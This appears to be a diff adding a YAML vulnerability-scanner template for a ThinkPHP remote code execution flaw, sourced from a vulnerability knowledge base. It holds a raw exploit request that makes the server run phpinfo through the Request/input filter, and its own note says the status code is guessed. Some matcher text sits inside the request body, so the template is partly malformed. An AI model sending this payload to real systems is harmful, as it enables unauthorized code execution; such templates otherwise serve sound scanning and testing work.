@@ -1,0 +1,36 @@
+id: poc-tasmiy11fog22kgr
+info:
+  name: thinkphp_request_input_rce
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tasmiy11fog22kgr
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tasmiy11fog22kgr
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /index.php?s=index/%5Cthink%5CRequest/input&filter=phpinfo&data=1 HTTP/1.1
+
+
+    # 响应代码特征
+
+    -1
+
+
+    # 响应内容特征
+
+    ^(?=.*?PHP)(?=.*?Version).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
